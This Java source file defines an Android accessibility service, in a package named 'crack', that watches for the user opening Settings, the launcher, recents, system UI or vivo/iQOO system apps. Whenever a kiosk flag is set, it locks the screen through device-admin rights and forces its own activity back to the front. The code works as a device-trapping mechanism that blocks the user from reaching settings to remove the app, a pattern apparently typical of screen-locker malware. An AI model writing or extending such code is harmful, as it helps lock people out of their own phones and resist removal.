package com.elysium.crack;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class KioskAccessibilityService extends AccessibilityService {
    private static long lastLockTime = 0;
    private static final long LOCK_COOLDOWN = 1000; // Минимум 1 сек между блокировками

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                String pkg = packageName.toString();
                
                boolean isKioskRunning = getSharedPreferences("kiosk", MODE_PRIVATE)
                        .getBoolean("is_running", false);
                
                if (!isKioskRunning) return;

                if (pkg.equals("com.android.settings") || 
                    pkg.contains("launcher") || 
                    pkg.contains("recents") ||
                    pkg.contains("systemui") ||
                    pkg.contains("iqoo") ||
                    pkg.contains("vivo")) {
                    
                    long now = System.currentTimeMillis();
                    // Блокируем только если прошло достаточно времени
                    if (now - lastLockTime > LOCK_COOLDOWN) {
                        try {
                            android.app.admin.DevicePolicyManager dpm = 
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            android.content.ComponentName admin = 
                                new android.content.ComponentName(this, AdminReceiver.class);
                            if (dpm != null && dpm.isAdminActive(admin)) {
                                dpm.lockNow();
                                lastLockTime = now;
                            }
                        } catch (Throwable ignored) {}

                        Intent i = new Intent(this, KioskActivity.class);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                                   Intent.FLAG_ACTIVITY_CLEAR_TOP | 
                                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                        startActivity(i);
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
}